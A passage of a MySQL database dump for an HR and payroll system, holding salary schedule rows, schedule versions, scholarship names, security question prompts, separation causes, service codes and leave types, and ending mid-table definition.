INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '39203.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '39650.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '43681.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '44184.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '44694.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '45209.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '45732.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '46261.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '46796.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '47338.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '48313.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '49052.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '49803.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '50566.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '51342.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '52130.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '52932.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '53746.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '54251.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '55085.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '55934.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '56796.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '57673.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '58564.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '59469.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '60389.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '60901.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '61844.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '62803.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '63777.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '64768.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '66797.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '67837.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '65774.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '68415.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '69481.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '70565.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '71666.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '72785.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '73923.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '75079.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '76253.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '76907.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '78111.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '79336.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '80583.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '81899.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '83235.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '84594.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '85975.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '86742.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '88158.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '89597.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '91059.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '92545.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '94057.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '95592.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '97152.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '98886.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '100500.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '102140.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '103808.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '105502.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '107224.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '108974.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '110753.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '111742.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '113565.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '115419.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '117303.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '119217.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '121163.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '123140.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '125150.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '126267.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '128329.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '130423.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '132552.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '134715.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '136914.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '139149.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '141420.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '142683.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '145011.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '147378.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '149784.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '152228.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '154714.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '157239.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '159804.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '161231.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '163863.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '166537.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '169256.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '172018.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '174826.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '177679.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '180579.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '182191.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '185165.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('33', '30', '188187.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '188187.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '191259.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '194380.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '197553.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '200777.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '204054.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '268121.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '273358.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '278697.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '284140.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '289691.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '295349.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '301117.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '306999.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '319660.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '326107.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '332682.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '339392.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '33', '0.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '33', '0.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '33', '0.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '33', '0.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '346236.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '353218.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '360342.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '367609.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '403620.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '33', '415728.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '33', '0.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '33', '0.00', '8');


#
# TABLE STRUCTURE FOR: tblsalaryschedversion
#

DROP TABLE IF EXISTS `tblsalaryschedversion`;

CREATE TABLE `tblsalaryschedversion` (
  `version` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL DEFAULT '',
  `description` varchar(50) NOT NULL DEFAULT '',
  `effectivity` date NOT NULL DEFAULT '0000-00-00',
  `unused` tinyint(1) NOT NULL DEFAULT 0,
  `active` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`version`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('1', 'Default', 'Default', '0000-00-00', '0', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('2', 'Third Tranche', 'Third Tranche Monthly Salary', '2011-06-01', '1', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('3', 'Fourth Tranche', 'Fourth Tranche Monthly Salary Schedule for Civilia', '2012-06-01', '1', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('4', 'EO 201 s.2016 - First Tranche', 'EO 201 s.2016 - First Tranche', '2016-01-01', '1', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('5', 'EO 201 s.2016 - Second Tranche', 'EO 201 s.2016 - Second Tranche', '2017-01-01', '1', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('6', 'EO 201 ', 's. 2016', '2019-01-01', '1', '0');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('8', 'NBC 584', 'Second Tranche Salary Schedule for Civilian Person', '2021-01-01', '1', '1');
INSERT INTO `tblsalaryschedversion` (`version`, `title`, `description`, `effectivity`, `unused`, `active`) VALUES ('7', 'NBC 579', 'First Tranche  CY 2020', '2020-01-01', '1', '0');


#
# TABLE STRUCTURE FOR: tblscheduler_logs
#

DROP TABLE IF EXISTS `tblscheduler_logs`;

CREATE TABLE `tblscheduler_logs` (
  `id` int(11) NOT NULL DEFAULT 0,
  `script` varchar(130) CHARACTER SET latin1 COLLATE latin1_general_ci DEFAULT NULL,
  `output` text CHARACTER SET latin1 COLLATE latin1_general_ci DEFAULT NULL,
  `execution_time` varchar(130) CHARACTER SET latin1 COLLATE latin1_general_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblscholarship
#

DROP TABLE IF EXISTS `tblscholarship`;

CREATE TABLE `tblscholarship` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `description` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;

INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('1', 'DOST-SEI Scholarship');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('2', 'MalacaÃ±ang Scholar');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('6', 'ACTC Scholarship Develpoment Program');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('4', 'DOST-HRDP');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('5', 'FPJ Scholarship Program');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('7', 'DOST Scholarship Program');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('8', 'JLP Scholar');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('9', 'DOST-ASTHRDP');
INSERT INTO `tblscholarship` (`id`, `description`) VALUES ('10', 'University Scholar');


#
# TABLE STRUCTURE FOR: tblsecuritycode
#

DROP TABLE IF EXISTS `tblsecuritycode`;

CREATE TABLE `tblsecuritycode` (
  `securityID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `securityQuestion` varchar(30) NOT NULL DEFAULT '',
  `securityAnswer` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`securityID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblsecurityquestion
#

DROP TABLE IF EXISTS `tblsecurityquestion`;

CREATE TABLE `tblsecurityquestion` (
  `securityCode` int(11) NOT NULL AUTO_INCREMENT,
  `securityQuestion` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`securityCode`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('1', 'What is the first name of your favorite uncle?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('2', 'Where did you meet your spouse?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('3', 'What is your oldest cousin\'s name?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('4', 'What is your youngest child\'s nickname?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('5', 'What is the first name of your oldest niece?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('6', 'What is the first name of your oldest nephew?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('7', 'What is the first name of favourite aunt?');
INSERT INTO `tblsecurityquestion` (`securityCode`, `securityQuestion`) VALUES ('8', 'Where did you spent your honeymoon?');


#
# TABLE STRUCTURE FOR: tblseparationcause
#

DROP TABLE IF EXISTS `tblseparationcause`;

CREATE TABLE `tblseparationcause` (
  `separationCause` varchar(50) NOT NULL DEFAULT '',
  `system` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`separationCause`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('AWOL', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Deceased', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Drop-from-the-Rolls', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('End-of-Contract', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Rationalization-Plan', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Resigned', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Retired', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Terminated', '1');
INSERT INTO `tblseparationcause` (`separationCause`, `system`) VALUES ('Transferred', '1');


#
# TABLE STRUCTURE FOR: tblservicecode
#

DROP TABLE IF EXISTS `tblservicecode`;

CREATE TABLE `tblservicecode` (
  `serviceCode` varchar(20) NOT NULL DEFAULT '',
  `serviceDesc` varchar(50) NOT NULL DEFAULT '',
  `system` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`serviceCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('GOV', 'Government', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('PRIV', 'Private', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('SPRIV', 'Semi-Private', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('LGU', 'Local Government Unit', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('GOCC', 'Government Owned and Controlled Corporation', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('SGOV', 'Semi-Government', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('GPRJ', 'Government Project', '1');
INSERT INTO `tblservicecode` (`serviceCode`, `serviceDesc`, `system`) VALUES ('SUC', 'State Universities and Colleges', '0');


#
# TABLE STRUCTURE FOR: tblservicerecord
#

DROP TABLE IF EXISTS `tblservicerecord`;

CREATE TABLE `tblservicerecord` (
  `serviceRecID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `serviceFromDate` date NOT NULL DEFAULT '0000-00-00',
  `serviceToDate` varchar(10) NOT NULL DEFAULT '0000-00-00',
  `tmpServiceToDate` varchar(25) NOT NULL DEFAULT 'Present',
  `positionCode` varchar(10) NOT NULL DEFAULT '',
  `positionDesc` text NOT NULL,
  `salary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `salaryPer` varchar(10) NOT NULL DEFAULT '',
  `stationAgency` varchar(50) NOT NULL DEFAULT '',
  `salaryGrade` varchar(10) DEFAULT '',
  `appointmentCode` varchar(50) NOT NULL DEFAULT '',
  `governService` varchar(5) DEFAULT NULL,
  `NCCRA` varchar(20) DEFAULT NULL,
  `separationCause` varchar(20) DEFAULT NULL,
  `separationDate` varchar(10) DEFAULT NULL,
  `branch` varchar(50) DEFAULT NULL,
  `currency` varchar(10) NOT NULL DEFAULT '',
  `remarks` varchar(50) NOT NULL DEFAULT '',
  `lwop` int(11) NOT NULL DEFAULT 0,
  `processor` varchar(50) NOT NULL,
  `signee` varchar(50) NOT NULL,
  PRIMARY KEY (`serviceRecID`),
  KEY `empNumber` (`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblsignatory
#

DROP TABLE IF EXISTS `tblsignatory`;

CREATE TABLE `tblsignatory` (
  `signatoryId` int(11) NOT NULL AUTO_INCREMENT,
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  `signatory` text NOT NULL,
  `signatoryPosition` text NOT NULL,
  `signatoryOrder` int(11) NOT NULL DEFAULT 0,
  `sig_module` tinyint(4) NOT NULL,
  PRIMARY KEY (`signatoryId`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblspecificleave
#

DROP TABLE IF EXISTS `tblspecificleave`;

CREATE TABLE `tblspecificleave` (
  `leaveCode` char(3) NOT NULL DEFAULT '',
  `specifyLeave` varchar(255) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('PL', 'Personal Milestone');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('PL', 'Parental Obligation');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('PL', 'Filial Obligation');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('VL', 'Abroad');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('PL', 'Domestic Emergency');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('PL', 'Personal Transaction');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('SL', 'Out-patient');
INSERT INTO `tblspecificleave` (`leaveCode`, `specifyLeave`) VALUES ('VL', 'PERSONAL TRANSACTION');


#
# TABLE STRUCTURE FOR: tbltaxdetails
#

DROP TABLE IF EXISTS `tbltaxdetails`;

CREATE TABLE `tbltaxdetails` (
